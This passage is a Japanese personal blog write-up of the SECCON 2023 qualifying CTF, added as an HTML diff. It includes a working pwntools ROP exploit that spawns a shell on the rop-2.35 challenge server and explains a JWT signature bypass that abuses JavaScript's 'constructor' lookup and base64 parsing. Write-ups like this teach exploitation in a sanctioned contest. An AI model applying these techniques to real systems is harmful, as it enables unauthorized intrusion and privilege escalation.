@@ -1,0 +1,1131 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.111.3 with theme Tranquilpeak 0.4.8-BETA">
+<meta name="author" content="Kazutoshi Noguchi">
+<meta name="keywords" content="">
+<meta name="description" content="2023-09-16 〜 17 にかけて開催された SECCON 2023 予選に参加しました。
+結果は全体 58位, 国内19位でした。">
+
+
+<meta property="og:description" content="2023-09-16 〜 17 にかけて開催された SECCON 2023 予選に参加しました。
+結果は全体 58位, 国内19位でした。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SECCON 2023 Quals Writeup">
+<meta name="twitter:title" content="SECCON 2023 Quals Writeup">
+<meta property="og:url" content="https://ngkz.github.io/2023/09/seccon-2023-quals-writeup/">
+<meta property="twitter:url" content="https://ngkz.github.io/2023/09/seccon-2023-quals-writeup/">
+<meta property="og:site_name" content="Fierce Falcon Laboratory">
+<meta property="og:description" content="2023-09-16 〜 17 にかけて開催された SECCON 2023 予選に参加しました。
+結果は全体 58位, 国内19位でした。">
+<meta name="twitter:description" content="2023-09-16 〜 17 にかけて開催された SECCON 2023 予選に参加しました。
+結果は全体 58位, 国内19位でした。">
+<meta property="og:locale" content="ja">
+
+  
+    <meta property="article:published_time" content="2023-09-18T14:02:32">
+  
+  
+    <meta property="article:modified_time" content="2023-09-18T14:02:32">
+  
+  
+  
+    
+      <meta property="article:section" content="CTF">
+    
+      <meta property="article:section" content="writeup">
+    
+  
+  
+    
+      <meta property="article:tag" content="SECCON">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+  <meta name="twitter:site" content="@n_g_k_z">
+
+
+  <meta name="twitter:creator" content="@n_g_k_z">
+
+
+
+
+
+
+  <meta property="og:image" content="https://ngkz.github.io/2023/09/seccon-2023-quals-writeup/cert.jpg">
+  <meta property="twitter:image" content="https://ngkz.github.io/2023/09/seccon-2023-quals-writeup/cert.jpg">
+
+
+
+
+
+  <meta property="og:image" content="https://ngkz.github.io/insignia.png">
+  <meta property="twitter:image" content="https://ngkz.github.io/insignia.png">
+
+
+    <title>SECCON 2023 Quals Writeup</title>
+
+    <link rel="icon" href="https://ngkz.github.io/favicon.ico">
+    
+
+    
+
+    <link rel="canonical" href="https://ngkz.github.io/2023/09/seccon-2023-quals-writeup/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://ngkz.github.io/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="1">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://ngkz.github.io/">Fierce Falcon Laboratory</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://ngkz.github.io/page/profile/">
+    
+    
+    
+      
+        <img class="header-picture" src="https://ngkz.github.io/insignia.png" alt="プロフィール画像" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="1">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://ngkz.github.io/page/profile/">
+          <img class="sidebar-profile-picture" src="https://ngkz.github.io/insignia.png" alt="プロフィール画像" />
+        </a>
+        <h4 class="sidebar-profile-name">Kazutoshi Noguchi</h4>
+        
+          <h5 class="sidebar-profile-bio">I&rsquo;m interested in Computer, Trip, Electronics, and DIY.</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://ngkz.github.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">ホーム</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://ngkz.github.io/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">カテゴリー</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://ngkz.github.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">タグ</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://ngkz.github.io/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">アーカイブ</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://ngkz.github.io/page/profile/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">プロフィール</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/ngkz" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://twitter.com/n_g_k_z" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
+      
+      <span class="sidebar-button-desc">Twitter</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://ngkz.github.io/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="1"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      SECCON 2023 Quals Writeup
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2023-09-18T14:02:32&#43;09:00">
+        
+  
+  
+  
+  
+    2023-09-18
+  
+
+      </time>
+    
+    
+  
+  
+    <span>カテゴリー</span>
+    
+      <a class="category-link" href="https://ngkz.github.io/categories/ctf">CTF</a>, 
+    
+      <a class="category-link" href="https://ngkz.github.io/categories/writeup">writeup</a>
+    
+  
+
+  </div>
+
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <p>2023-09-16 〜 17 にかけて開催された SECCON 2023 予選に参加しました。
+結果は全体 58位, 国内19位でした。</p>
+<div class="figure center nocaption" >
+  
+    <img class="fig-img" src="cert.jpg" style="width: 500px;height: 500px;" alt="Certificate of Participation, Term: 1y1, 832pt, Rank 58/653">
+  
+  
+</div>
+
+<h1 id="table-of-contents">目次</h1><nav id="TableOfContents">
+  <ul>
+    <li><a href="#7年ぶりにctf">7年ぶりにCTF</a>
+      <ul>
+        <li><a href="#ctfって何すか-知らない人向け">CTFって何すか (知らない人向け)</a></li>
+      </ul>
+    </li>
+    <li><a href="#解いた問題">解いた問題</a>
+      <ul>
+        <li><a href="#welcome-welcome">Welcome (welcome)</a></li>
+        <li><a href="#rop-235-pwning">rop-2.35 (pwning)</a></li>
+        <li><a href="#bad-jwt-web">Bad JWT (web)</a></li>
+        <li><a href="#readme-2023-misc">readme 2023 (misc)</a></li>
+        <li><a href="#jumpout-reversing">jumpout (reversing)</a></li>
+        <li><a href="#perfect-blu-reversing">Perfect Blu (reversing)</a></li>
+        <li><a href="#selfcet-pwning">selfcet (pwning)</a></li>
+        <li><a href="#crabbox-misc">crabbox (misc)</a></li>
+      </ul>
+    </li>
+    <li><a href="#おわり">おわり</a></li>
+  </ul>
+</nav>
+<h2 id="7年ぶりにctf">7年ぶりにCTF</h2>
+<p><abbr title="場面緘黙症があり、書くのも苦手で、しかも面接と診察が一番苦手な場面なので、人生がうまくいかなくて… 全てに嫌気が差してSNSなどのアカウントから何から全部消して2年間インターネットから消えてたり、その後もInfoSecから距離を取ったりしていました。当時のCTFプレーヤーなら私の正体の察しがつくと思います (OSINT 100)。">事情</abbr>があってCTFからずっと離れていたのですが、最近心境の変化があり、久し振りに参戦しました。最後の参加が2016年なので、7年ぶりですね。<strong>7年!?</strong></p>
+
+
+ 
+  
+  
+  
+  
+    
+      
+    
+  
+    
+  
+
+<div class="figure center" >
+  
+    <a class="fancybox" href="result.jpg" title="Team Profile" data-fancybox-group="">
+  
+    <img class="fig-img" src="result.jpg" style="width: 814px;" alt="Team Profile">
+  
+    </a>
+  
+   
+    <span class="caption">Team Profile</span>
+  
+</div>
+
+<p>7年のブランクで腕が完全に錆びついている上にゴタゴタしてて事前にほとんど練習できなかったにもかかわらず、無謀にもソロで突っこんだので振るわない成績で終わってしまいました。国内チームは国内順位10位以上で予選通過できますが、当然通過できませんでした。鍛えなおさないといけませんね。<br>
+特にCryptoは全くダメで、元々nolzeくん頼りで弱かったのに、さらに数学もRSAも完全に忘れてしまったのでwarmup問題すら解けませんでした。精進します…</p>
+<h3 id="ctfって何すか-知らない人向け">CTFって何すか (知らない人向け)</h3>
+<p>ハッキング競技です。出題された問題に攻撃するなり解読するなりして隠されたフラグと呼ばれる文字列を探しだすので、<code>Capture The Flag</code> (フラグを獲れ)、略してCTFと呼びます。獲らない競技形式もありますが、それもCTFと呼びます。</p>
+<p>CTF知らない人はこの先を読んでもよく分からない気がする。</p>
+<h2 id="解いた問題">解いた問題</h2>
+<h3 id="welcome-welcome">Welcome (welcome)</h3>
+<p>連絡用のDiscordに貼ってあるFlagを入力します。参加者を確実に連絡用サーバーに誘導するいいアイデアですね。</p>
+<h3 id="rop-235-pwning">rop-2.35 (pwning)</h3>
+<p>問題:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x10</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;echo Enter something:&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(buf);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>問題がReturn Oriented Programmingで<code>system(&quot;/bin/sh&quot;)</code>しろと叫んでいますね。NX EnabledでStack Smashing Protctorなしです。<br>
+一見すると簡単なROP問で、<a href="https://www.youtube.com/live/jwM5OP81cl0?feature=shared&amp;t=3976">実際簡単なROP問です</a>。想定解ではROP gadgetすら不要です。</p>
+<p>しかし、なぜか書いたexploitが実環境で動かなくて、「warpup問がこんな難しいはずがない、絶対に何かがおかしい」と思いつつ環境に依存しない無駄に複雑なチェーンに書き直したりしてたら2時間近くも嵌まってしまいました。こんなの10分でできないといけないですよ、ヘタクソ!</p>
+<p>ところで、Flagが<code>SECCON{i_miss_you_libc_csu_init_:cry:}</code> だったのですが、これは2018年に現れた<code>return-to-csu</code>と呼ばれるROPの手法のことらしく、どうやら私が引退していた間に新しい攻撃法が現れ、そして対策されて消えていっていたみたいです。諸行無常。<del>この手法現役時代に使ったことあるような…</del></p>
+<p>exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;rop-2-35.seccon.games&#34;</span>, <span style="color:#ae81ff">9999</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># r = process(&#34;./chall&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># input()</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">24</span> <span style="color:#f92672">-</span> len(p))
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x40113d</span>) <span style="color:#75715e">#poprbp</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x404020</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#75715e">#rbp = gets@plt + 0x10</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x401171</span>) <span style="color:#75715e">#gets(rbp-0x10); rsp = rbp; pop rbp; ret</span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(buf)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x404020</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x401050</span>) <span style="color:#75715e">#gets@plt @ 0x404020 = system</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;sh</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x10</span> <span style="color:#f92672">-</span> len(buf))
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x404020</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#75715e">#new rbp</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> (p64(<span style="color:#ae81ff">0x401016</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">128</span> <span style="color:#75715e">#rsp += 8; ret</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x401171</span>) <span style="color:#75715e">#gets == system, gets(rbp-0x10)</span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(buf)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h3 id="bad-jwt-web">Bad JWT (web)</h3>
+<p>ペイロードの<code>isAdmin</code>が<code>true</code>のJWTを渡すとFlagを返してくれるwebサービスを攻略する問題です。</p>
+<p>JWTの検証処理はこうなっています:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// 抜粋:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">algorithms</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">hs256</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">secret</span>) =&gt; 
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">base64UrlEncode</span>(<span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">createHmac</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, <span style="color:#a6e22e">secret</span>).<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">data</span>).<span style="color:#a6e22e">digest</span>()),
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">hs512</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">secret</span>) =&gt; 
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">base64UrlEncode</span>(<span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">createHmac</span>(<span style="color:#e6db74">&#39;sha512&#39;</span>, <span style="color:#a6e22e">secret</span>).<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">data</span>).<span style="color:#a6e22e">digest</span>()),
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">stringifyPart</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">obj</span>) =&gt; {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">base64UrlEncode</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">obj</span>));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">parsePart</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">str</span>) =&gt; {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">base64UrlDecode</span>(<span style="color:#a6e22e">str</span>));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">createSignature</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">header</span>, <span style="color:#a6e22e">payload</span>, <span style="color:#a6e22e">secret</span>) =&gt; {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">stringifyPart</span>(<span style="color:#a6e22e">header</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">stringifyPart</span>(<span style="color:#a6e22e">payload</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">signature</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">algorithms</span>[<span style="color:#a6e22e">header</span>.<span style="color:#a6e22e">alg</span>.<span style="color:#a6e22e">toLowerCase</span>()](<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">secret</span>); <span style="color:#75715e">// &lt;-- !!!!!!!!!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">signature</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">parseToken</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">token</span>) =&gt; {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">parts</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;.&#39;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">parts</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">!==</span> <span style="color:#ae81ff">3</span>) <span style="color:#66d9ef">throw</span> Error(<span style="color:#e6db74">&#39;Invalid JWT format&#39;</span>);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> [ <span style="color:#a6e22e">header</span>, <span style="color:#a6e22e">payload</span>, <span style="color:#a6e22e">signature</span> ] <span style="color:#f92672">=</span> <span style="color:#a6e22e">parts</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">parsedHeader</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">parsePart</span>(<span style="color:#a6e22e">header</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">parsedPayload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">parsePart</span>(<span style="color:#a6e22e">payload</span>);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> { <span style="color:#a6e22e">header</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">parsedHeader</span>, <span style="color:#a6e22e">payload</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">parsedPayload</span>, <span style="color:#a6e22e">signature</span> }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">verify</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">token</span>, <span style="color:#a6e22e">secret</span>) =&gt; {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">header</span>, <span style="color:#a6e22e">payload</span>, <span style="color:#a6e22e">signature</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">expected_signature</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">parseToken</span>(<span style="color:#a6e22e">token</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">calculated_signature</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">createSignature</span>(<span style="color:#a6e22e">header</span>, <span style="color:#a6e22e">payload</span>, <span style="color:#a6e22e">secret</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">header</span>, <span style="color:#a6e22e">payload</span>, <span style="color:#a6e22e">expected_signature</span>, <span style="color:#a6e22e">calculated_signature</span>)
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">calculated_buf</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">calculated_signature</span>, <span style="color:#e6db74">&#39;base64&#39;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">expected_buf</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">expected_signature</span>, <span style="color:#e6db74">&#39;base64&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">compare</span>(<span style="color:#a6e22e">calculated_buf</span>, <span style="color:#a6e22e">expected_buf</span>) <span style="color:#f92672">!==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">throw</span> Error(<span style="color:#e6db74">&#39;Invalid signature&#39;</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">payload</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>JavaScriptにはこのような<del>クソ</del>楽しい仕様があるので:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> {}.<span style="color:#a6e22e">constructor</span>
+</span></span><span style="display:flex;"><span>[Function<span style="color:#f92672">:</span> Object]
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> Object(<span style="color:#e6db74">&#34;foo&#34;</span>, <span style="color:#e6db74">&#34;bar&#34;</span>)
+</span></span><span style="display:flex;"><span>[String<span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;foo&#39;</span>]
+</span></span></code></pre></div><p>ヘッダーの<code>alg</code>として<code>constructor</code>を渡すと、<code>createSignature()</code>の2行目が</p>
+<pre tabindex="0"><code>const signature = algorithms[header.alg.toLowerCase()](data, secret);
+↓
+const signature = algorithms[&#34;constructor&#34;](data, secret);
+↓
+const signature = Object(data, secret);
+↓
+const signature = data;
+↓
+const signature = `${stringifyPart(header)}.${stringifyPart(payload)}`;
+</code></pre><p>となり、signatureの計算結果が予測可能な値にできてしまいます。</p>
+<p>signatureに<code>.</code>を入れると<code>parseToken()</code>でエラーが出るので、一見<code>${stringifyPart(header)}.${stringifyPart(payload)}</code>をsignatureとして渡すことはできないように見えます。</p>
+<p>しかし、<code>Buffer.from(..., 'base64')</code>にはBASE64にない文字を無視する仕様があるため、headerのが<code>alg</code>が<code>&quot;constructor&quot;</code>、payloadの<code>isAdmin</code>が<code>true</code>、signatureが<code>${stringifyPart(header)}${stringifyPart(payload)}</code>のトークンを渡せば、signatureが再計算結果 <code>${stringifyPart(header)}.${stringifyPart(payload)}</code>と一致すると判定されて検証を通ってしまいます。</p>
+<h3 id="readme-2023-misc">readme 2023 (misc)</h3>
+<p>問題:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> mmap
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> signal
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>signal<span style="color:#f92672">.</span>alarm(<span style="color:#ae81ff">60</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;./flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>)
+</span></span><span style="display:flex;"><span>    mm <span style="color:#f92672">=</span> mmap<span style="color:#f92672">.</span>mmap(f<span style="color:#f92672">.</span>fileno(), <span style="color:#ae81ff">0</span>, prot<span style="color:#f92672">=</span>mmap<span style="color:#f92672">.</span>PROT_READ)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">FileNotFoundError</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[-] Flag does not exist&#34;</span>)
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;path: &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;flag.txt&#39;</span> <span style="color:#f92672">in</span> path:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[-] Path not allowed&#34;</span>)
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> <span style="color:#e6db74">&#39;fd&#39;</span> <span style="color:#f92672">in</span> path:
